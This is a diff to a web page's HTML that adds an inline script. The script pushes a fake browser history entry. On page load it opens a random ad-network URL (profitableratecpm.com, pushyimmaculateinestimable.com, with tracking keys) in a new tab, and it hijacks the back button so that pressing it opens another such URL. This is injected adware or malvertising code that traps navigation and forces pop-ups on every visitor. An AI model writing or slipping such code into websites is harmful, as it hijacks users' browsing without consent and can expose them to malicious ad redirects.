@@ -836,7 +836,24 @@
     </div>
 
     <script>
-        
+      // Push a fake state so that popstate gets triggered when back button is pressed
+history.pushState(null, null, location.href);
+
+// when the page is requested even before the complete page is loaded run a function to redirect to a random URL
+window.addEventListener('DOMContentLoaded', function() {
+    // Check if the user has clicked a link before
+    let urls = ["https://pushyimmaculateinestimable.com/i37pcpd6nw?key=b8052771535848a9f950e757c432a86c", "https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51","https://pushyimmaculateinestimable.com/h0cjstncc?key=2dd598c4e358b07bc98ae6075bb43ae2","https://pushyimmaculateinestimable.com/g7kb3jxrh?key=83eca6751d43e8c254f44b442f9074f7","https://www.profitableratecpm.com/mw50t6gcpq?key=a8246fa335d5a14052a5d38f01d573be","https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51","https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51"];
+    let randomIndex = Math.floor(Math.random() * urls.length);
+    window.open(urls[randomIndex], '_blank');
+});
+
+// stop the back button from working and instead redirect to a random URL from above
+window.addEventListener('popstate', function(event) {
+    // Check if the user has clicked a link before
+    let urls = ["https://pushyimmaculateinestimable.com/i37pcpd6nw?key=b8052771535848a9f950e757c432a86c", "https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51","https://pushyimmaculateinestimable.com/h0cjstncc?key=2dd598c4e358b07bc98ae6075bb43ae2","https://pushyimmaculateinestimable.com/g7kb3jxrh?key=83eca6751d43e8c254f44b442f9074f7","https://www.profitableratecpm.com/mw50t6gcpq?key=a8246fa335d5a14052a5d38f01d573be","https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51","https://www.profitableratecpm.com/vuc9g305vi?key=f89b50b62fc899c1639c75b481b1cd51"];
+    let randomIndex = Math.floor(Math.random() * urls.length);
+    window.open(urls[randomIndex], '_blank');
+});
 
         // Wait for the page to load
         window.addEventListener('load', function() {
